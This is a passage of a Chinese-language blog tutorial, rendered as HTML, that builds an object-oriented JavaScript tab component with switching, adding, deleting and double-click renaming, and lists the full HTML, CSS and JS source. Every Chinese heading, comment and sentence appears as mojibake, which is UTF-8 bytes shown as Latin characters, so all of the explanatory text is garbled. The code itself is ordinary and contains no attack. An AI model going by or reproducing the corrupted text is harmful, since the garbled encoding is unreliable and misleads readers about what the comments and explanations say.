è®©å®ƒçš„å‰ä¸€ä¸ªli å¤„äºé€‰å®šçŠ¶æ€</span></span><br><span class="line">       index--;</span><br><span class="line">       <span class="comment">// æ‰‹åŠ¨è°ƒç”¨æˆ‘ä»¬çš„ç‚¹å‡»äº‹ä»¶(å³åˆ‡æ¢active)  ä¸éœ€è¦é¼ æ ‡è§¦å‘</span></span><br><span class="line">       <span class="comment">//åˆ é™¤æœ€åä¸€ä¸ªtagæ—¶ï¼Œä¼šæŠ¥é”™ï¼Œå› ä¸ºç´¢å¼•ä¸º-1çš„æ²¡æœ‰ç‚¹å‡»äº‹ä»¶ that.lis[index].click(); å…ˆåˆ¤æ–­å‰é¢æ˜¯å¦ä¸ºçœŸ</span></span><br><span class="line">       that.lis[index] &amp;&amp; that.lis[index].click();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="åŒå‡»Tabæ ï¼Œå¯ä»¥ç¼–è¾‘Tabæ åç§°"><a href="#åŒå‡»Tabæ ï¼Œå¯ä»¥ç¼–è¾‘Tabæ åç§°" class="headerlink" title="åŒå‡»Tabæ ï¼Œå¯ä»¥ç¼–è¾‘Tabæ åç§°"></a>åŒå‡»Tabæ ï¼Œå¯ä»¥ç¼–è¾‘Tabæ åç§°</h3><p><img src="https://i.loli.net/2021/06/07/uXGUIc1B4OPwZko.gif" alt="ç¼–è¾‘tabé¡µ.gif"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">           <span class="comment">//åŒå‡»</span></span><br><span class="line">           <span class="built_in">this</span>.spans[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line">           <span class="built_in">this</span>.sections[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="title">updateNode</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.spans = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;.fisrstnav li span:first-child&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 4. ä¿®æ”¹åŠŸèƒ½</span></span><br><span class="line">   <span class="function"><span class="title">editTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">       <span class="comment">//è·å–åŸå…ˆå†…å®¹</span></span><br><span class="line">       <span class="keyword">var</span> str = <span class="built_in">this</span>.innerHTML;</span><br><span class="line">       <span class="comment">// åŒå‡»ç¦æ­¢é€‰å®šæ–‡å­—</span></span><br><span class="line">       <span class="built_in">window</span>.getSelection ? <span class="built_in">window</span>.getSelection().removeAllRanges() : <span class="built_in">document</span>.selection.empty();</span><br><span class="line">       <span class="comment">// åŒå‡»æ–‡å­—çš„æ—¶å€™ï¼Œåœ¨é‡Œé¢ç”Ÿæˆä¸€ä¸ªæ–‡æœ¬æ¡†, å½“å¤±å»ç„¦ç‚¹æˆ–è€…æŒ‰ä¸‹å›è½¦ æŠŠæ–‡æœ¬æ¡†è¾“å…¥çš„å€¼ç»™åŸå…ˆå…ƒç´ </span></span><br><span class="line">       <span class="built_in">this</span>.innerHTML = <span class="string">&#x27;&lt;input type=&quot;text&quot; /&gt;&#x27;</span>;</span><br><span class="line">       <span class="keyword">var</span> input = <span class="built_in">this</span>.children[<span class="number">0</span>];</span><br><span class="line">       <span class="comment">//è‹¥æ²¡æœ‰æ›´æ”¹ï¼Œåˆ™èµ‹å€¼åŸå…ˆå†…å®¹</span></span><br><span class="line">       input.value = str;</span><br><span class="line">       <span class="comment">// å‡ºç°æ–‡æœ¬æ¡†æ—¶ï¼Œé‡Œé¢çš„æ–‡å­—å¤„äºé€‰å®šçŠ¶æ€</span></span><br><span class="line">       input.select();</span><br><span class="line">       <span class="comment">// å½“æˆ‘ä»¬ç¦»å¼€æ–‡æœ¬æ¡†å°±æŠŠæ–‡æœ¬æ¡†é‡Œé¢çš„å€¼ç»™span </span></span><br><span class="line">       input.onblur = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="comment">//thisæŒ‡å‘input</span></span><br><span class="line">           <span class="built_in">this</span>.parentNode.innerHTML = <span class="built_in">this</span>.value;</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="comment">// æŒ‰ä¸‹å›è½¦ä¹Ÿå¯ä»¥æŠŠæ–‡æœ¬æ¡†é‡Œé¢çš„å€¼ç»™span</span></span><br><span class="line">       input.onkeyup = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (e.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">               <span class="comment">// æ‰‹åŠ¨è°ƒç”¨è¡¨å•å¤±å»ç„¦ç‚¹äº‹ä»¶  ä¸éœ€è¦é¼ æ ‡ç¦»å¼€æ“ä½œ</span></span><br><span class="line">               <span class="built_in">this</span>.blur();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="éœ€æ³¨æ„çš„ä¸€äº›ç»†èŠ‚"><a href="#éœ€æ³¨æ„çš„ä¸€äº›ç»†èŠ‚" class="headerlink" title="éœ€æ³¨æ„çš„ä¸€äº›ç»†èŠ‚"></a>éœ€æ³¨æ„çš„ä¸€äº›ç»†èŠ‚</h3><ol><li><strong>åˆ é™¤</strong>ä¸€ä¸ªæ ç›®<strong>åé»˜è®¤é€‰ä¸­å‰ä¸€ä¸ª</strong>æ ç›®</li><li>æ–°å¢çš„æ ç›®<strong>ä¹Ÿèƒ½å®ç°åŸºæœ¬åŠŸèƒ½</strong></li><li>å½“é»˜è®¤é€‰ä¸­çš„æ˜¯ç¬¬ä¸€ä¸ªï¼Œå¹¶ä¸”åˆ é™¤çš„æ—¶å€™ï¼Œé€‰ä¸­åˆ é™¤åçš„ç¬¬ä¸€ä¸ª</li><li>åœ¨ç¼–è¾‘Tabåç§°çš„æ—¶å€™ï¼Œ<strong>å›è½¦é”®</strong>ä¹Ÿèƒ½<strong>ç¡®è®¤</strong>ç¼–è¾‘</li><li>æ–°å¢çš„æ ç›®<strong>é»˜è®¤é€‰ä¸­</strong></li></ol><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p><strong>htmlï¼š</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>é¢å‘å¯¹è±¡ Tab<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./styles/tab.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./styles/style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h4</span>&gt;</span></span><br><span class="line">            Js é¢å‘å¯¹è±¡ åŠ¨æ€æ·»åŠ æ ‡ç­¾é¡µ</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tabsbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tab&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- tab æ ‡ç­¾ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;fisrstnav&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;liactive&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>æµ‹è¯•1<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;iconfont icon-guanbi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>æµ‹è¯•2<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;iconfont icon-guanbi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>æµ‹è¯•3<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;iconfont icon-guanbi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tabadd&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span>&gt;</span>+<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!-- tab å†…å®¹ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tabscon&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;conactive&quot;</span>&gt;</span>æµ‹è¯•1<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">section</span>&gt;</span>æµ‹è¯•2<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">section</span>&gt;</span>æµ‹è¯•3<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/tab.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>css:</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">main</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">960px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">50px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">main</span> <span class="selector-tag">h4</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabsbox</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">900px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid lightsalmon;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-class">.liactive</span> &#123;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#tab</span> <span class="selector-tag">input</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">80%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">60%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> <span class="selector-tag">span</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    user-select: none;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabadd</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="comment">/* width: 100px; */</span></span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabadd</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">float</span>: right;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    user-select: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabscon</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabscon</span> <span class="selector-tag">section</span>,</span><br><span class="line"><span class="selector-class">.tabscon</span> <span class="selector-tag">section</span><span class="selector-class">.conactive</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabscon</span> <span class="selector-tag">section</span><span class="selector-class">.conactive</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>javascript:</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> that;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tab</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// è·å–å…ƒç´ </span></span><br><span class="line">        that = <span class="built_in">this</span>;</span><br><span class="line">        <span class="built_in">this</span>.main = <span class="built_in">document</span>.querySelector(id);</span><br><span class="line">        <span class="built_in">this</span>.add = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.tabadd&#x27;</span>);</span><br><span class="line">        <span class="comment">// liçš„çˆ¶å…ƒç´ </span></span><br><span class="line">        <span class="built_in">this</span>.ul = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.fisrstnav ul:first-child&#x27;</span>);</span><br><span class="line">        <span class="comment">// section çˆ¶å…ƒç´ </span></span><br><span class="line">        <span class="built_in">this</span>.fsection = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.tabscon&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.updateNode();</span><br><span class="line">            <span class="comment">// init åˆå§‹åŒ–æ“ä½œè®©ç›¸å…³çš„å…ƒç´ ç»‘å®šäº‹ä»¶</span></span><br><span class="line">            <span class="built_in">this</span>.add.onclick = <span class="built_in">this</span>.addTab;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">                <span class="built_in">this</span>.lis[i].index = i;</span><br><span class="line">                <span class="built_in">this</span>.lis[i].onclick = <span class="built_in">this</span>.toggleTab;</span><br><span class="line">                <span class="built_in">this</span>.remove[i].onclick = <span class="built_in">this</span>.removeTab;</span><br><span class="line">                <span class="built_in">this</span>.spans[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line">                <span class="built_in">this</span>.sections[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å› ä¸ºæˆ‘ä»¬åŠ¨æ€æ·»åŠ å…ƒç´  éœ€è¦ä»æ–°è·å–å¯¹åº”çš„å…ƒç´ </span></span><br><span class="line">    <span class="function"><span class="title">updateNode</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.lis = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">            <span class="built_in">this</span>.sections = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;section&#x27;</span>);</span><br><span class="line">            <span class="built_in">this</span>.remove = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;.icon-guanbi&#x27;</span>);</span><br><span class="line">            <span class="built_in">this</span>.spans = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;.fisrstnav li span:first-child&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 1. åˆ‡æ¢åŠŸèƒ½</span></span><br><span class="line">    <span class="function"><span class="title">toggleTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="comment">// console.log(this.index);</span></span><br><span class="line">            that.clearClass();</span><br><span class="line">            <span class="built_in">this</span>.className = <span class="string">&#x27;liactive&#x27;</span>;</span><br><span class="line">            that.sections[<span class="built_in">this</span>.index].className = <span class="string">&#x27;conactive&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ¸…é™¤æ‰€æœ‰li å’Œsection çš„ç±»</span></span><br><span class="line">    <span class="function"><span class="title">clearClass</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">                <span class="built_in">this</span>.lis[i].className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="built_in">this</span>.sections[i].className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2. æ·»åŠ åŠŸèƒ½</span></span><br><span class="line">    <span class="function"><span class="title">addTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            that.clearClass();</span><br><span class="line">            <span class="comment">// (1) åˆ›å»ºliå…ƒç´ å’Œsectionå…ƒç´  </span></span><br><span class="line">            <span class="keyword">var</span> random = <span class="built_in">Math</span>.random();</span><br><span class="line">            <span class="keyword">var</span> li = <span class="string">&#x27;&lt;li class=&quot;liactive&quot;&gt;&lt;span&gt;æ–°é€‰é¡¹å¡&lt;/span&gt;&lt;span class=&quot;iconfont icon-guanbi&quot;&gt;&lt;/span&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> section = <span class="string">&#x27;&lt;section class=&quot;conactive&quot;&gt;æµ‹è¯• &#x27;</span> + random + <span class="string">&#x27;&lt;/section&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">// (2) æŠŠè¿™ä¸¤ä¸ªå…ƒç´ è¿½åŠ åˆ°å¯¹åº”çš„çˆ¶å…ƒç´ é‡Œé¢</span></span><br><span class="line">            that.ul.insertAdjacentHTML(<span class="string">&#x27;beforeend&#x27;</span>, li);</span><br><span class="line">            that.fsection.insertAdjacentHTML(<span class="string">&#x27;beforeend&#x27;</span>, section);</span><br><span class="line">            that.init();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3. åˆ é™¤åŠŸèƒ½</span></span><br><span class="line">    <span class="function"><span class="title">removeTab</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">            e.stopPropagation(); <span class="comment">// é˜»æ­¢å†’æ³¡ é˜²æ­¢è§¦å‘li çš„åˆ‡æ¢ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">            <span class="keyword">var</span> index = <span class="built_in">this</span>.parentNode.index;</span><br><span class="line">            <span class="built_in">console</span>.log(index);</span><br><span class="line">            <span class="comment">// æ ¹æ®ç´¢å¼•å·åˆ é™¤å¯¹åº”çš„li å’Œsection   remove()æ–¹æ³•å¯ä»¥ç›´æ¥åˆ é™¤æŒ‡å®šçš„å…ƒç´ </span></span><br><span class="line">            that.lis[index].remove();</span><br><span class="line">            that.sections[index].remove();</span><br><span class="line">            that.init();</span><br><span class="line">            <span class="comment">// å½“æˆ‘ä»¬åˆ é™¤çš„ä¸æ˜¯é€‰ä¸­çŠ¶æ€çš„li çš„æ—¶å€™,åŸæ¥çš„é€‰ä¸­çŠ¶æ€liä¿æŒä¸å˜</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">document</span>.querySelector(<span class="string">&#x27;.liactive&#x27;</span>)) <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">// å½“æˆ‘ä»¬åˆ é™¤äº†é€‰ä¸­çŠ¶æ€çš„è¿™ä¸ªli çš„æ—¶å€™, è®©å®ƒçš„å‰ä¸€ä¸ªli å¤„äºé€‰å®šçŠ¶æ€</span></span><br><span class="line">            index--;</span><br><span class="line">            <span class="comment">// æ‰‹åŠ¨è°ƒç”¨æˆ‘ä»¬çš„ç‚¹å‡»äº‹ä»¶  ä¸éœ€è¦é¼ æ ‡è§¦å‘</span></span><br><span class="line">            that.lis[index] &amp;&amp; that.lis[index].click();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4. ä¿®æ”¹åŠŸèƒ½</span></span><br><span class="line">    <span class="function"><span class="title">editTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="built_in">this</span>.innerHTML;</span><br><span class="line">        <span class="comment">// åŒå‡»ç¦æ­¢é€‰å®šæ–‡å­—</span></span><br><span class="line">        <span class="built_in">window</span>.getSelection ? <span class="built_in">window</span>.getSelection().removeAllRanges() : <span class="built_in">document</span>.selection.empty();</span><br><span class="line">        <span class="comment">// alert(11);</span></span><br><span class="line">        <span class="built_in">this</span>.innerHTML = <span class="string">&#x27;&lt;input type=&quot;text&quot; /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> input = <span class="built_in">this</span>.children[<span class="number">0</span>];</span><br><span class="line">        input.value = str;</span><br><span class="line">        input.select(); <span class="comment">// æ–‡æœ¬æ¡†é‡Œé¢çš„æ–‡å­—å¤„äºé€‰å®šçŠ¶æ€</span></span><br><span class="line">        <span class="comment">// å½“æˆ‘ä»¬ç¦»å¼€æ–‡æœ¬æ¡†å°±æŠŠæ–‡æœ¬æ¡†é‡Œé¢çš„å€¼ç»™span </span></span><br><span class="line">        input.onblur = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.parentNode.innerHTML = <span class="built_in">this</span>.value;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// æŒ‰ä¸‹å›è½¦ä¹Ÿå¯ä»¥æŠŠæ–‡æœ¬æ¡†é‡Œé¢çš„å€¼ç»™span</span></span><br><span class="line">        input.onkeyup = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (e.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">                <span class="comment">// æ‰‹åŠ¨è°ƒç”¨è¡¨å•å¤±å»ç„¦ç‚¹äº‹ä»¶  ä¸éœ€è¦é¼ æ ‡ç¦»å¼€æ“ä½œ</span></span><br><span class="line">                <span class="built_in">this</span>.blur();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> Tab(<span class="string">&#x27;#tab&#x27;</span>);</span><br></pre></td></tr></table></figure><hr><h1 id="æ„é€ å‡½æ•°å’ŒåŸå‹"><a href="#æ„é€ å‡½æ•°å’ŒåŸå‹" class="headerlink" title="æ„é€ å‡½æ•°å’ŒåŸå‹"></a>æ„é€ å‡½æ•°å’ŒåŸå‹</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>åœ¨<strong>ES6ä¹‹å‰</strong>ï¼Œå¯¹è±¡ä¸æ˜¯åŸºäºç±»åˆ›å»ºçš„ï¼Œè€Œæ˜¯ç”¨ä¸€ç§ç§°ä¸º<strong>æ„é€ 